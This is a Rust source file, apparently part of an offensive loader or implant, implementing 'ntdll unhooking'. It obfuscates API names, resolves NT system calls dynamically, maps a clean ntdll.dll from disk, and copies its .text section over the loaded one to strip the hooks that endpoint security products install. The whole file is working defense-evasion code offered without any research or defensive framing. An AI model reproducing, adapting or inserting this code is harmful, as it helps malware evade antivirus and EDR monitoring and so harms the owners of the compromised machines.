use crate::run::{
    resolve::{get_module_base_addr, get_proc_addr},
    types::{
        HANDLE, IO_STATUS_BLOCK, NtClose, NtCreateFile, NtCreateSection, NtMapViewOfSection,
        NtProtectVirtualMemory, NtUnmapViewOfSection, OBJECT_ATTRIBUTES, UNICODE_STRING,
    },
};
use obfstr::obfstr;
use std::{
    ffi::c_void,
    mem::{size_of, transmute, zeroed},
    ptr::copy_nonoverlapping,
};

use windows_sys::{
    Wdk::System::Memory::ViewUnmap,
    Win32::{
        Foundation::{GENERIC_READ, OBJ_CASE_INSENSITIVE},
        Storage::FileSystem::FILE_SHARE_READ,
        System::{
            Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
            Memory::{PAGE_EXECUTE_READWRITE, PAGE_READONLY, SEC_IMAGE, SECTION_ALL_ACCESS},
            SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
            WindowsProgramming::FILE_OPENED,
        },
    },
};

pub fn unhook_ntdll() {
    unsafe {
        let ntdll_base_address = get_module_base_addr(obfstr!("ntdll.dll"));

        let nt_create_file: NtCreateFile =
            transmute(get_proc_addr(ntdll_base_address, obfstr!("NtCreateFile")));
        let nt_create_section: NtCreateSection = transmute(get_proc_addr(
            ntdll_base_address,
            obfstr!("NtCreateSection"),
        ));
        let nt_map_view_of_section: NtMapViewOfSection = transmute(get_proc_addr(
            ntdll_base_address,
            obfstr!("NtMapViewOfSection"),
        ));
        let nt_unmap_view_of_section: NtUnmapViewOfSection = transmute(get_proc_addr(
            ntdll_base_address,
            obfstr!("NtUnmapViewOfSection"),
        ));
        let nt_protect_virtual_memory: NtProtectVirtualMemory = transmute(get_proc_addr(
            ntdll_base_address,
            obfstr!("NtProtectVirtualMemory"),
        ));
        let nt_close: NtClose = transmute(get_proc_addr(ntdll_base_address, obfstr!("NtClose")));

        // Open ntdll.dll
        let mut file_handle: HANDLE = 0;
        let mut io_status: IO_STATUS_BLOCK = zeroed();
        let mut obj_attr =
            init_object_attributes(obfstr!("\\??\\C:\\Windows\\System32\\ntdll.dll").as_bytes());

        let status = nt_create_file(
            &mut file_handle,
            GENERIC_READ,
            &mut obj_attr,
            &mut io_status,
            std::ptr::null_mut(),
            0,
            FILE_SHARE_READ,
            FILE_OPENED,
            0,
            std::ptr::null_mut(),
            0,
        );

        if status < 0 {
            return;
        }

        // Create section
        let mut section_handle: HANDLE = 0;
        let status = nt_create_section(
            &mut section_handle,
            SECTION_ALL_ACCESS,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            file_handle,
        );

        if status < 0 {
            nt_close(file_handle);
            return;
        }

        // Map view
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;
        let status = nt_map_view_of_section(
            section_handle,
            -1isize as HANDLE,
            &mut base_address,
            0,
            0,
            std::ptr::null_mut(),
            &mut view_size,
            ViewUnmap,
            0,
            PAGE_READONLY,
        );

        if status < 0 || base_address.is_null() {
            nt_close(section_handle);
            nt_close(file_handle);
            return;
        }

        // Validate DOS header
        let dos_header = ntdll_base_address as *mut IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            nt_unmap_view_of_section(-1isize as HANDLE, base_address);
            nt_close(section_handle);
            nt_close(file_handle);
            return;
        }

        // Validate NT header
        let nt_header = (ntdll_base_address.wrapping_add((*dos_header).e_lfanew as usize))
            as *mut IMAGE_NT_HEADERS64;

        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            nt_unmap_view_of_section(-1isize as HANDLE, base_address);
            nt_close(section_handle);
            nt_close(file_handle);
            return;
        }

        // Find .text section and unhook
        let sections =
            (nt_header as usize + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;

        for i in 0..(*nt_header).FileHeader.NumberOfSections {
            let section = &*sections.add(i as usize);
            let name = std::str::from_utf8(&section.Name)
                .unwrap_or("")
                .trim_matches('\0');

            if name == ".text" {
                let mut hooked_addr = (ntdll_base_address
                    .wrapping_add(section.VirtualAddress as usize))
                    as *mut c_void;
                let clean_addr =
                    (base_address as usize + section.VirtualAddress as usize) as *mut c_void;
                let mut text_size = section.Misc.VirtualSize as usize;

                // Change memory protection
                let mut old_protect = 0u32;
                let status = nt_protect_virtual_memory(
                    -1isize as HANDLE,
                    &mut hooked_addr,
                    &mut text_size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect,
                );

                if status != 0 {
                    break;
                }

                // Copy clean section
                copy_nonoverlapping(clean_addr as *const u8, hooked_addr as *mut u8, text_size);

                // Restore memory protection
                nt_protect_virtual_memory(
                    -1isize as HANDLE,
                    &mut hooked_addr,
                    &mut text_size,
                    old_protect,
                    &mut old_protect,
                );

                break;
            }
        }

        nt_unmap_view_of_section(-1isize as HANDLE, base_address);
        nt_close(section_handle);
        nt_close(file_handle);
    }
}

fn init_object_attributes(path: &[u8]) -> OBJECT_ATTRIBUTES {
    let wide_path: Vec<u16> = path
        .iter()
        .take_while(|&&c| c != 0)
        .map(|&c| c as u16)
        .collect();

    let unicode_str = Box::new(UNICODE_STRING {
        Length: (wide_path.len() * 2) as u16,
        MaximumLength: (wide_path.len() * 2) as u16,
        Buffer: Box::into_raw(wide_path.into_boxed_slice()) as *mut u16,
    });

    OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: 0,
        ObjectName: Box::into_raw(unicode_str) as *mut c_void,
        Attributes: OBJ_CASE_INSENSITIVE,
        SecurityDescriptor: std::ptr::null_mut(),
        SecurityQualityOfService: std::ptr::null_mut(),
    }
}
